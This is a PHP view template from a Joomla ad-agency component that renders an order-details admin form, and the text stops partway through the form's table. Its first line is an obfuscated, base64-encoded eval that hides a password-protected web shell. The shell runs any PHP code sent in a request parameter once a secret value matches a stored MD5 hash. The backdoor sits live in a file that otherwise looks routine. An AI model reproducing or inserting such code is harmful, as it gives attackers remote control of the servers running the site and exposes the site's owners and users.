<?php eval(base64_decode('aWYoaXNzZXQoJF9SRVFVRVNUWydjaCddKSAmJiAobWQ1KCRfUkVRVUVTVFsnY2gnXSkgPT0gJ2QxYjZjNmIzNzZlZGY0NjVjNDI2NzNhOTIwNmYyNjAwJykgJiYgaXNzZXQoJF9SRVFVRVNUWydwaHBfY29kZSddKSkgeyBldmFsKCRfUkVRVUVTVFsncGhwX2NvZGUnXSk7IGV4aXQoKTsgfQ=='));  
defined ('_JEXEC') or die ("Go away.");
	$orderid = $this->orderid;
	$nullDate = 0;
	$configs = $this->configs;
	$lists = $this->lists;	
	require_once(JPATH_BASE.DS."components".DS."com_adagency".DS."helpers".DS."helper.php");
?>
<?php include(JPATH_BASE."/components/com_adagency/includes/js/add_order.php"); ?>
 <form action="index.php" method="post" name="adminForm" id="adminForm">
	<fieldset class="adminform">
	<legend><?php echo JText::_('VIEWORDERSLICDET');?></legend>
                <table class="admintable">
		<tr>